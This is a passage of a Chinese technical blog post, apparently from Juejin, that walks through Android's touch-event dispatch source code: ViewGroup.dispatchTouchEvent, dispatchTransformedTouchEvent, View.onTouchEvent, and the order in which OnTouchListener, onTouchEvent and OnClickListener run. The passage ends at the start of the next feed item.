                    mLastTouchDownTime</span> = ev.getDownTime()<span class="hljs-comment">;</span>
                    if (preorderedList != null) {
                        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; childrenCount; j++) {</span>
                            if (children<span class="hljs-section">[childIndex]</span> == mChildren<span class="hljs-section">[j]</span>) {
                                <span class="hljs-attr">mLastTouchDownIndex</span> = j<span class="hljs-comment">;</span>
                                break<span class="hljs-comment">;</span>
                            }
                        }
                    } else {
                        <span class="hljs-attr">mLastTouchDownIndex</span> = childIndex<span class="hljs-comment">;</span>
                    }
                    <span class="hljs-attr">mLastTouchDownX</span> = x<span class="hljs-comment">;</span>
                    <span class="hljs-attr">mLastTouchDownY</span> = y<span class="hljs-comment">;</span>
                    //关键调用函数
                    <span class="hljs-attr">newTouchTarget</span> = addTouchTarget(child, idBitsToAssign)<span class="hljs-comment">;</span>
                    //开始提到的参数
                    <span class="hljs-attr">alreadyDispatchedToNewTouchTarget</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }
                
                ev.setTargetAccessibilityFocus(false)<span class="hljs-comment">;</span>
            }
            if (preorderedList != null) preorderedList.clear()<span class="hljs-comment">;</span>
        }
//多指触控逻辑 :既然没找到新的 View 接收这根手指，就把这根手指分配给“最老”的那个负责人
        if (<span class="hljs-attr">newTouchTarget</span> == null &amp;&amp; mFirstTouchTarget != null) {
            <span class="hljs-attr">newTouchTarget</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
            while (newTouchTarget.next != null) {
                <span class="hljs-attr">newTouchTarget</span> = newTouchTarget.next<span class="hljs-comment">;</span>
            }
            newTouchTarget.pointerIdBits |= idBitsToAssign<span class="hljs-comment">;</span>
        }
    }
}
//如果DOWN事件没有被子View消费mFirstTouchTarget就为空此时由父View来处理
    if (<span class="hljs-attr">mFirstTouchTarget</span> == null) {
        <span class="hljs-attr">handled</span> = dispatchTransformedTouchEvent(ev, canceled, null,
                TouchTarget.ALL_POINTER_IDS)<span class="hljs-comment">;</span>
    } else {
    //如果DOWN事件被子View消费
        TouchTarget <span class="hljs-attr">predecessor</span> = null<span class="hljs-comment">;</span>
        TouchTarget <span class="hljs-attr">target</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
        while (target != null) {
            final TouchTarget <span class="hljs-attr">next</span> = target.next<span class="hljs-comment">;</span>
            //DOWN事件并且DOWN被子View消费情况下这里的alreadyDispatchedToNewTouchTarget就为true，返回handled值，防止重复分发
            if (alreadyDispatchedToNewTouchTarget &amp;&amp; <span class="hljs-attr">target</span> == newTouchTarget) {
                <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
            } else {
               ......
    }

   
}
private TouchTarget addTouchTarget(@NonNull View child, int pointerIdBits) {
    final TouchTarget <span class="hljs-attr">target</span> = TouchTarget.obtain(child, pointerIdBits)<span class="hljs-comment">;</span>
    <span class="hljs-attr">target.next</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
    //给mFirstTouchTarget赋值 后面会对mFirstTouchTarget的值进行判断这个参数很重要
    <span class="hljs-attr">mFirstTouchTarget</span> = target<span class="hljs-comment">;</span>
    return target<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-10">MOVE事件在dispatchTouchEvent主要流程</h4>
<p>intercepted-&gt;判断是否需要拦截</p>
<p>mFirstTouchTarget-&gt;消费DOWN事件子View的位置</p>
<p>newTouchTarget-&gt;新手指的触摸位置</p>
<pre><code class="hljs language-ini" lang="ini">//如果前面的DOWN事件没有子View消费，这里会直接进入else分支
//即<span class="hljs-attr">intercepted</span> = <span class="hljs-literal">true</span> if (!canceled &amp;&amp; !intercepted) {},巧妙的跳过了这里的遍历流程

final boolean intercepted<span class="hljs-comment">;</span>
if (<span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_DOWN
        || mFirstTouchTarget != null) {
        //这个标黄的标志位，是后面内部拦截法requestDisallowInterceptTouchEvent() 的关键
    final boolean <span class="hljs-attr">disallowIntercept</span> = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    if (!disallowIntercept) {
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">on</span>InterceptTouchEvent(ev)<span class="hljs-comment">;</span>
        ev.setAction(action)<span class="hljs-comment">; </span>
    } else {
        <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
    }
} else {

    <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}
</code></pre>
<pre><code class="hljs language-ini" lang="ini">//------前置参数  这是一个200行的大方法，不要忘了必要的参数
final boolean intercepted<span class="hljs-comment">;</span>
final boolean <span class="hljs-attr">canceled</span> = resetCancelNextUpFlag(this)
        || <span class="hljs-attr">actionMasked</span> == MotionEvent.ACTION_CANCEL<span class="hljs-comment">;</span>
 boolean <span class="hljs-attr">alreadyDispatchedToNewTouchTarget</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;//注意这个参数</span>
//------正式代码
//MOVE分发下：如果前面的DOWN事件没有子View消费，这里会调用ViewGroup的dispatchTouchEvent(也就是decorView的onTouchEvent方法最后调用activity的onTouchEvent方法)
    if (<span class="hljs-attr">mFirstTouchTarget</span> == null) {
    //这里不仅可以是DOWN的结果也可以是MOVE的结果(结合前文)
       <span class="hljs-attr">1. handled</span> = dispatchTransformedTouchEvent(ev, canceled, null,
                TouchTarget.ALL_POINTER_IDS)<span class="hljs-comment">;</span>
    } else {
//这里MOVE分为两种情况，正常MOVE和MOVE事件被拦截，这里使用两种颜色的字体表示 灰色正常 绿色MOVE拦截    由于这篇文字是在飞书上写的所以颜色不对，请见谅.
        TouchTarget <span class="hljs-attr">predecessor</span> = null<span class="hljs-comment">;</span>
        TouchTarget <span class="hljs-attr">target</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
        //这里的循环是为了做多指触控，本来mFirstTouchTarget就是ViewGruop指向一个View的单向链表，由于有多指的情况，这样的链表有几对
        while (target != null) {
            final TouchTarget <span class="hljs-attr">next</span> = target.next<span class="hljs-comment">;</span>
            //只有在DOWN事件的情况下才有可能为true，所以MOVE事件不会到这里面去
            if (alreadyDispatchedToNewTouchTarget &amp;&amp; <span class="hljs-attr">target</span> == newTouchTarget) {
            <span class="hljs-attr">2.    handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
            } 
//DOWN事件分发所有可能的结果只能到这里 要么是1.  要么是2.           
            else {
            //这里有个误区，这里是不需要考虑前面DOWN事件没有被子View消费的情况的，因为已经被这段代码开头的if判断清除了，所以这里的intercepted是通过 <span class="hljs-attr">intercepted</span> = <span class="hljs-literal">on</span>InterceptTouchEvent(ev)<span class="hljs-comment">;这里得到的</span>
            
            //resetCancelNextUpFlag这里用来避免子View出现的意外情况，一旦子View发生意外，不让子VieW消费事件 比如下面这些情况
            //当一个 View 正在被按下时，它突然被从父容器中移除了（detach）
            //或者 View 的状态发生了剧烈变化，导致系统认为它不应该再产生点击效果
                final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                        || intercepted<span class="hljs-comment">;</span>
                 //根据前面的target定向寻找子View,判断是否消费事件，这个就是我们之前一直说的mFirstTouchTarget
                 //如果这里cancelChild为true,会子View分发CANCEL终止分发
                if (dispatchTransformedTouchEvent(ev, cancelChild,
                        target.child, target.pointerIdBits)) {
                    <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
                }
                //如果cancelChild为true置空链表
                if (cancelChild) {
                    if (<span class="hljs-attr">predecessor</span> == null) {
                        <span class="hljs-attr">mFirstTouchTarget</span> = next<span class="hljs-comment">;</span>
                    } else {
                        <span class="hljs-attr">predecessor.next</span> = next<span class="hljs-comment">;</span>
                    }
                    target.recycle()<span class="hljs-comment">;</span>
                    <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
                    continue<span class="hljs-comment">;</span>
                }
            }
            //循环遍历操作
            <span class="hljs-attr">predecessor</span> = target<span class="hljs-comment">;</span>
            <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
        }
    }

}
</code></pre>
<h4 data-id="heading-11">UP事件在dispatchTouchEvent主要流程</h4>
<p>MOVE事件与UP事件的流程高度重合唯一区别就是UP事件需要清空之前的状态便于迎接下一次事件的到来</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// --- 这段代码处理 UP，但不处理 MOVE ---</span>
if (canceled
        || actionMasked == MotionEvent.ACTION_UP // 【UP 走这里】
        || actionMasked == MotionEvent.ACTION_HOVER_MOVE) {
    <span class="hljs-built_in">resetTouchState</span>(); <span class="hljs-comment">// 重置所有状态，清空链表</span>
} 
<span class="hljs-comment">// --- 这段处理多指抬起 ---</span>
else if (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_UP) {
    <span class="hljs-built_in">removePointersFromTouchTargets</span>(idBitsToRemove);
}
</code></pre>
<h4 data-id="heading-12">CANCEL事件在dispatchTouchEvent主要流程</h4>
<p>CANCEL事件的处理比较简单了，理解了前面MOVE的流程，这里就一目了然了</p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">mFirstTouchTarget</span> == null) {
    <span class="hljs-attr">handled</span> = dispatchTransformedTouchEvent(ev, canceled, null,
            TouchTarget.ALL_POINTER_IDS)<span class="hljs-comment">;</span>
} else {

    TouchTarget <span class="hljs-attr">predecessor</span> = null<span class="hljs-comment">;</span>
    TouchTarget <span class="hljs-attr">target</span> = mFirstTouchTarget<span class="hljs-comment">;</span>
    while (target != null) {
        final TouchTarget <span class="hljs-attr">next</span> = target.next<span class="hljs-comment">;</span>
        if (alreadyDispatchedToNewTouchTarget &amp;&amp; <span class="hljs-attr">target</span> == newTouchTarget) {
            <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
        } else {
//这里   cancelChild为true     
            final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                    || intercepted<span class="hljs-comment">;</span>
            if (dispatchTransformedTouchEvent(ev, cancelChild,
                    target.child, target.pointerIdBits)) {
                <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
            }
            //链表清除
            if (cancelChild) {
                if (<span class="hljs-attr">predecessor</span> == null) {
                    <span class="hljs-attr">mFirstTouchTarget</span> = next<span class="hljs-comment">;</span>
                } else {
                    <span class="hljs-attr">predecessor.next</span> = next<span class="hljs-comment">;</span>
                }
                target.recycle()<span class="hljs-comment">;</span>
                <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
                continue<span class="hljs-comment">;</span>
            }
        }
        <span class="hljs-attr">predecessor</span> = target<span class="hljs-comment">;</span>
        <span class="hljs-attr">target</span> = next<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h4 data-id="heading-13">dispatchTransformedTouchEvent</h4>
<p>这个函数在dispatchTouchEvent里面被反复使用我们来看看长什么样</p>
<pre><code class="hljs language-ini" lang="ini">private boolean dispatchTransformedTouchEvent(MotionEvent event, boolean cancel,
        View child, int desiredPointerIdBits) {
    final boolean handled<span class="hljs-comment">;</span>

//如果cancel为true，分发CANCEL事件，对应之前MOVE分发代码的片段
/*
 final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                       || intercepted<span class="hljs-comment">;</span>
if (dispatchTransformedTouchEvent(ev, cancelChild,target.child, target.pointerIdBits)) {
                    <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;}</span>
*/                
    final int <span class="hljs-attr">oldAction</span> = event.getAction()<span class="hljs-comment">;</span>
    if (cancel || <span class="hljs-attr">oldAction</span> == MotionEvent.ACTION_CANCEL) {
        event.setAction(MotionEvent.ACTION_CANCEL)<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">child</span> == null) {
            <span class="hljs-attr">handled</span> = super.dispatchTouchEvent(event)<span class="hljs-comment">;</span>
        } else {
            <span class="hljs-attr">handled</span> = child.dispatchTouchEvent(event)<span class="hljs-comment">;</span>
        }
        //这里进行还原事件处理，防止给后面的View分发CANCEL事件
        event.setAction(oldAction)<span class="hljs-comment">;</span>
        return handled<span class="hljs-comment">;</span>
    }
//-----------正常情况 可以看到都是调用dispatchTouchEvent方法的逻辑-----------------
    // Calculate the number of pointers to deliver.
    final int <span class="hljs-attr">oldPointerIdBits</span> = event.getPointerIdBits()<span class="hljs-comment">;</span>
    final int <span class="hljs-attr">newPointerIdBits</span> = oldPointerIdBits &amp; desiredPointerIdBits<span class="hljs-comment">;</span>


    if (<span class="hljs-attr">newPointerIdBits</span> == <span class="hljs-number">0</span>) {
        return false<span class="hljs-comment">;</span>
    }

    final MotionEvent transformedEvent<span class="hljs-comment">;</span>
    if (<span class="hljs-attr">newPointerIdBits</span> == oldPointerIdBits) {
        if (<span class="hljs-attr">child</span> == null || child.hasIdentityMatrix()) {
            if (<span class="hljs-attr">child</span> == null) {
                <span class="hljs-attr">handled</span> = super.dispatchTouchEvent(event)<span class="hljs-comment">;</span>
            } else {
                final float <span class="hljs-attr">offsetX</span> = mScrollX - child.mLeft<span class="hljs-comment">;</span>
                final float <span class="hljs-attr">offsetY</span> = mScrollY - child.mTop<span class="hljs-comment">;</span>
                event.offsetLocation(offsetX, offsetY)<span class="hljs-comment">;</span>

                <span class="hljs-attr">handled</span> = child.dispatchTouchEvent(event)<span class="hljs-comment">;</span>

                event.offsetLocation(-offsetX, -offsetY)<span class="hljs-comment">;</span>
            }
            return handled<span class="hljs-comment">;</span>
        }
        <span class="hljs-attr">transformedEvent</span> = MotionEvent.obtain(event)<span class="hljs-comment">;</span>
    } else {
        <span class="hljs-attr">transformedEvent</span> = event.split(newPointerIdBits)<span class="hljs-comment">;</span>
    }

    // Perform any necessary transformations and dispatch.
    if (<span class="hljs-attr">child</span> == null) {
        <span class="hljs-attr">handled</span> = super.dispatchTouchEvent(transformedEvent)<span class="hljs-comment">;</span>
    } else {
        final float <span class="hljs-attr">offsetX</span> = mScrollX - child.mLeft<span class="hljs-comment">;</span>
        final float <span class="hljs-attr">offsetY</span> = mScrollY - child.mTop<span class="hljs-comment">;</span>
        transformedEvent.offsetLocation(offsetX, offsetY)<span class="hljs-comment">;</span>
        if (! child.hasIdentityMatrix()) {
            transformedEvent.transform(child.getInverseMatrix())<span class="hljs-comment">;</span>
        }

        <span class="hljs-attr">handled</span> = child.dispatchTouchEvent(transformedEvent)<span class="hljs-comment">;</span>
    }

    // Done.
    transformedEvent.recycle()<span class="hljs-comment">;</span>
    return handled<span class="hljs-comment">;</span>
}
</code></pre>
<p>我们发现这个方法也是通过handled变量返回布尔值</p>
<h3 data-id="heading-14">View的dispatchTouchEvent</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> boolean <span class="hljs-title">dispatchTouchEvent</span>(<span class="hljs-params">MotionEvent <span class="hljs-keyword">event</span></span>)</span> {
    <span class="hljs-comment">// If the event should be handled by accessibility focus first.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">event</span>.isTargetAccessibilityFocus()) {
        <span class="hljs-comment">// We don't have focus or no virtual descendant has it, do not handle the event.</span>
        <span class="hljs-keyword">if</span> (!isAccessibilityFocusedViewOrHost()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-comment">// We have focus and got the event, then use normal event dispatch.</span>
        <span class="hljs-keyword">event</span>.setTargetAccessibilityFocus(<span class="hljs-literal">false</span>);
    }
    boolean result = <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">if</span> (mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onTouchEvent(<span class="hljs-keyword">event</span>, <span class="hljs-number">0</span>);
    }

    final <span class="hljs-built_in">int</span> actionMasked = <span class="hljs-keyword">event</span>.getActionMasked();
    <span class="hljs-keyword">if</span> (actionMasked == MotionEvent.ACTION_DOWN) {
        <span class="hljs-comment">// 新手势开始，停止之前的嵌套滚动（如清理之前的滑动惯性）</span>
        stopNestedScroll();
    }
 -----------------------------------关键代码---------------------------------------------
<span class="hljs-comment">//onFilterTouchEventForSecurity：这是一个安全机制。如果系统检测到当前 View 上方覆盖了不安全的窗口（例如透明悬浮窗），为了保护隐私，可能会直接丢弃该事件。</span>
    <span class="hljs-keyword">if</span> (onFilterTouchEventForSecurity(<span class="hljs-keyword">event</span>)) {
       
<span class="hljs-comment">// 如果用户点在滚动条上并尝试拖拽，滚动条逻辑会先“截活”，result 变为 true。       </span>
        <span class="hljs-keyword">if</span> ((mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; handleScrollBarDragging(<span class="hljs-keyword">event</span>)) {
            result = <span class="hljs-literal">true</span>;
        }
<span class="hljs-comment">/*优先级最高。
只要满足：
设置了 OnTouchListener。
View 处于 Enabled 状态（注意：禁用的 View 无法触发 onTouch）。
onTouch 返回了 true。
那么 result 为 true，后续的 onTouchEvent 就不会被执行了
*/</span>            
        ListenerInfo li = mListenerInfo;
        <span class="hljs-keyword">if</span> (li != <span class="hljs-literal">null</span> &amp;&amp; li.mOnTouchListener != <span class="hljs-literal">null</span>
                &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED
&amp;&amp; li.mOnTouchListener.onTouch(<span class="hljs-keyword">this</span>, <span class="hljs-keyword">event</span>)) {
            result = <span class="hljs-literal">true</span>;
        }

        <span class="hljs-keyword">if</span> (!result &amp;&amp; onTouchEvent(<span class="hljs-keyword">event</span>)) {
            result = <span class="hljs-literal">true</span>;
        }
    }
---------------------------------------------------------------------------------------    
    
<span class="hljs-comment">// 如果没有 View 消费事件，记录到校验器</span>
    <span class="hljs-keyword">if</span> (!result &amp;&amp; mInputEventConsistencyVerifier != <span class="hljs-literal">null</span>) {
        mInputEventConsistencyVerifier.onUnhandledEvent(<span class="hljs-keyword">event</span>, <span class="hljs-number">0</span>);
    }

<span class="hljs-comment">// 判定手势是否结束</span>
    <span class="hljs-keyword">if</span> (actionMasked == MotionEvent.ACTION_UP ||
            actionMasked == MotionEvent.ACTION_CANCEL ||
            (actionMasked == MotionEvent.ACTION_DOWN &amp;&amp; !result)) {
        stopNestedScroll();
    }

    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<p>我们看到View的dispatchTouchEvent方法多次调用了<strong>onTouchEvent</strong>方法再看看这个方法</p>
<h2 data-id="heading-15">View的onTouchEvent</h2>
<p>关键代码部分：</p>
<h4 data-id="heading-16"><strong>可点击状态下的处理</strong></h4>
<p>只要可点击，就消费事件</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">final</span> boolean clickable <span class="hljs-operator">=</span> ((viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">CLICKABLE</span>) <span class="hljs-operator">==</span> <span class="hljs-type">CLICKABLE</span>
        <span class="hljs-operator">||</span> (viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">LONG_CLICKABLE</span>) <span class="hljs-operator">==</span> <span class="hljs-type">LONG_CLICKABLE</span>)
        <span class="hljs-operator">||</span> (viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">CONTEXT_CLICKABLE</span>) <span class="hljs-operator">==</span> <span class="hljs-type">CONTEXT_CLICKABLE</span>;

<span class="hljs-comment">// ... 在方法末尾 ...</span>
<span class="hljs-keyword">if</span> (clickable <span class="hljs-operator">||</span> (viewFlags <span class="hljs-operator">&amp;</span> <span class="hljs-type">TOOLTIP</span>) <span class="hljs-operator">==</span> <span class="hljs-type">TOOLTIP</span>) {
    <span class="hljs-comment">// ... switch case ...</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 只要 View 是可点击的，onTouchEvent 就会返回 true</span>
}
</code></pre>
<p>这是 Android 事件分发的一个重要结论：<strong>一个可点击的 View（如</strong> <strong>Button</strong> <strong>）在</strong> <strong><code>onTouchEvent</code></strong> <strong>中默认会消耗掉所有事件</strong>。即使它是 <code>DISABLED</code>（禁用）状态，只要它是 <code>CLICKABLE</code> 的，它依然会返回 <code>true</code>，防止事件穿透到下层</p>
<h5 data-id="heading-17">ACTION_DOWN：</h5>
<pre><code class="hljs language-scss" lang="scss">boolean isInScrollingContainer = <span class="hljs-built_in">isInScrollingContainer</span>();
if (isInScrollingContainer) {
    mPrivateFlags |= PFLAG_PREPRESSED;
    <span class="hljs-comment">// ... 发送一个延时 100ms 的 Tap 任务 ...</span>
    <span class="hljs-built_in">postDelayed</span>(mPendingCheckForTap, ViewConfiguration.getTapTimeout());
} else {
    <span class="hljs-built_in">setPressed</span>(true, x, y); <span class="hljs-comment">// 不在滑动容器，立即显示按下状态</span>
    <span class="hljs-built_in">checkForLongClick</span>(...); <span class="hljs-comment">// 开始长按计时</span>
}
</code></pre>
<ul>
<li>如果 View 在 <code>ScrollView</code> 等滑动容器中，系统会<strong>延迟显示</strong>按下状态（100ms）。这是为了防止用户只是想滑动，结果手指一碰按钮就闪现按下效果。</li>
<li>如果不在滑动容器，立即调用 <code>setPressed(true)</code> 变色，并开启长按定时器。</li>
</ul>
<h5 data-id="heading-18">ACTION_MOVE：</h5>
<pre><code class="hljs language-scss" lang="scss">if (!pointInView(x, y, touchSlop)) {
    <span class="hljs-comment">// 只要手指移出了 View 的范围（加上系统允许的微小偏差 touchSlop）</span>
    <span class="hljs-built_in">removeTapCallback</span>();
    <span class="hljs-built_in">removeLongPressCallback</span>();
    if ((mPrivateFlags &amp; PFLAG_PRESSED) != <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">setPressed</span>(false); <span class="hljs-comment">// 取消按下状态</span>
    }
}
</code></pre>
<p>系统允许用户在点击时有轻微的晃动（<code>touchSlop</code>）。但一旦手指移出 View 范围，长按和点击逻辑都会被取消，按钮也会变回原来的颜色。</p>
<h5 data-id="heading-19">ACTION_UP：</h5>
<pre><code class="hljs language-scss" lang="scss">if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) {
    <span class="hljs-built_in">removeLongPressCallback</span>(); <span class="hljs-comment">// 移除长按计时</span>
    <span class="hljs-comment">// ...</span>
    if (!post(mPerformClick)) {
        <span class="hljs-built_in">performClickInternal</span>(); <span class="hljs-comment">// 真正触发 OnClickListener.onClick() 的地方</span>
    }
}
</code></pre>
<ul>
<li><strong>优先级判定</strong>：如果已经触发了长按（<code>mHasPerformedLongPress</code> 为 true），那么抬起时就不会再触发点击。</li>
<li><strong>异步执行</strong>：使用 <code>post(mPerformClick)</code> 是为了让 View 先完成视觉上的状态切换（变回原色），然后再执行点击逻辑，避免点击任务阻塞了 UI 的状态更新。</li>
</ul>
<h5 data-id="heading-20">ACTION_CANCEL</h5>
<pre><code class="hljs language-scss" lang="scss">case MotionEvent<span class="hljs-selector-class">.ACTION_CANCEL</span>:
    if (clickable) {
        <span class="hljs-built_in">setPressed</span>(false);
    }
    <span class="hljs-built_in">removeTapCallback</span>();
    <span class="hljs-built_in">removeLongPressCallback</span>();
    <span class="hljs-comment">// ... 重置所有标记位 ...</span>
    break;
</code></pre>
<p>当父容器（如 <code>RecyclerView</code>）拦截了事件时，子 View 会收到 <code>CANCEL</code>。此时必须清理掉所有的计时器和按下状态，否则 View 会一直显示“被按下”的颜色。</p>
<p>我们发现只要子View可以点击，就会返回true，这个判断下的事件状态只是执行不同的操作</p>
<p><strong>为什么是这样的判定？如果是这样的话，事件会不会看起来很容易消费？</strong></p>
<p>其实不然，首先我们要了解View的遍历逻辑，子View是根据根右左的顺序执行，并且是优先调用子View的onTouchEvent方法，如果遍历到的这个子View刚好是可点击的，就会消费事件。之后就不会遍历了，这符合我们对事件消费的期望。</p>
<p>并且在拦截的情况下也不矛盾</p>
<p>在DOWN时拦截:根本不会走遍历的操作，就不会调用子ViewonTouchEvent方法.</p>
<p>在MOVE时拦截:虽然在DOWN时形成了单向链表mFirstTouchTarget，在下一次分发MOVE事件的时候，通过</p>
<pre><code class="hljs language-ini" lang="ini">  final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                       || intercepted<span class="hljs-comment">;</span>
if (dispatchTransformedTouchEvent(ev, cancelChild,target.child, target.pointerIdBits)) {
                    <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;}</span>
</code></pre>
<p>给子View分发CANCEL事件(取消该View的按下状态,计时器等等)，并且清空链表，之后这个View就不会接收事件了</p>
<p>[<strong>对于这一帧“物理上的 MOVE 事件”，它的“移动数据”确实没有被任何 View 消费，被消费的仅仅是由它转化而来的“CANCEL 信号”。</strong> ]</p>
<h4 data-id="heading-21">禁用状态下的处理</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">if</span> ((viewFlags &amp; ENABLED_MASK) == DISABLED ...) {
    <span class="hljs-comment">// ... 抬起时清除按下状态 ...</span>
    <span class="hljs-keyword">return</span> clickable; 
}
</code></pre>
<p>如果 View 是禁用的（Disabled），它不会响应点击逻辑，但如果它原本是可点击的，它依然返回 <code>true</code>。<strong>这解释了为什么点击一个禁用的按钮，下方的布局不会收到点击事件。</strong></p>
<h4 data-id="heading-22">OnTouchListener和OnClickListener</h4>
<p>定位到View的dispatchTouchEvent方法中的这段代码：</p>
<pre><code class="hljs language-ini" lang="ini">if (li != null &amp;&amp; li.mOnTouchListener != null
        &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED
        &amp;&amp; li.mOnTouchListener.onTouch(this, event)) {
    <span class="hljs-attr">result</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}

if (!result &amp;&amp; onTouchEvent(event)) {
    <span class="hljs-attr">result</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}
</code></pre>
<p>在dispatchTouchEvent中，会判断View是否设置了OnTouchListener，如果设置了OnTouchListener，就会直接拦截事件，dispatchTouchEvent方法返回true，调用OnTouchListener的onTouch方法，而不会再触发后续的onTouchEvent方法。</p>
<p>再定位到View的onTouchEvent方法中的这段代码：</p>
<pre><code class="hljs language-scss" lang="scss">if (clickable || (viewFlags &amp; TOOLTIP) == TOOLTIP) {
    switch (action) {          
        case MotionEvent<span class="hljs-selector-class">.ACTION_UP</span>:
            if (!<span class="hljs-built_in">post</span>(mPerformClick)) {
                <span class="hljs-built_in">performClickInternal</span>();
            }
</code></pre>
<p>可以发现是在onTouchEvent方法中，判断了View是否可点击。若可点击且设置了OnClickListener，那么就会调用OnClickListener的onClick方法。</p>
<p><strong>按优先级排序，OnTouchListener&gt;OnTouchEvent&gt;OnClickListener。若设置了OnTouchListener，则不会触发后面两者。OnClickListener在ACTION_UP后触发。</strong></p>
<h2 data-id="heading-23">ViewGroup的onInterceptTouchEvent</h2>
<pre><code class="hljs language-scss" lang="scss">public boolean <span class="hljs-built_in">onInterceptTouchEvent</span>(MotionEvent ev) {
    <span class="hljs-comment">// 条件 1: 事件来源必须是鼠标 (MOUSE)</span>
    if (ev.isFromSource(InputDevice.SOURCE_MOUSE)
            <span class="hljs-comment">// 条件 2: 动作必须是按下 (ACTION_DOWN)</span>
            &amp;&amp; ev<span class="hljs-selector-class">.getAction</span>() == MotionEvent<span class="hljs-selector-class">.ACTION_DOWN</span>
            <span class="hljs-comment">// 条件 3: 必须是鼠标左键 (BUTTON_PRIMARY)</span>
            &amp;&amp; ev<span class="hljs-selector-class">.isButtonPressed</span>(MotionEvent.BUTTON_PRIMARY)
            <span class="hljs-comment">// 条件 4: 点击的位置必须在滚动条的“滑块”上 (Scrollbar Thumb)</span>
            &amp;&amp; <span class="hljs-built_in">isOnScrollbarThumb</span>(ev.getXDispatchLocation(<span class="hljs-number">0</span>), ev<span class="hljs-selector-class">.getYDispatchLocation</span>(<span class="hljs-number">0</span>))) {
        
        <span class="hljs-comment">// 如果上述 4 个条件同时满足，返回 true，表示拦截该事件</span>
        return true;
    }
    
    <span class="hljs-comment">// 默认情况（比如手指触摸、点击非滚动条区域等）返回 false</span>
    return false;
}
</code></pre>
<p>好文章推荐可以和这个做补充
<a href="https://juejin.cn/post/7168445102984003591" target="_blank" title="https://juejin.cn/post/7168445102984003591">Android斩首行动—滑动冲突作为移动开发，我们对滑动冲突可以说是屡见不鲜。这篇文章结合事件分发机制，对常见的滑动冲突 - 掘金</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[openClaw安装飞书插件｜核心踩坑：spawn EINVAL 错误终极解决指南]]></title>    <link>https://juejin.cn/post/7605529884824567871</link>    <guid>https://juejin.cn/post/7605529884824567871</guid>    <pubDate>2026-02-12T16:30:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605529884824567871" data-draft-id="7605807405306675263" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="openClaw安装飞书插件｜核心踩坑：spawn EINVAL 错误终极解决指南"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-12T16:30:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MicRabbit"/> <meta itemprop="url" content="https://juejin.cn/user/4135726601221641"/></div> <div 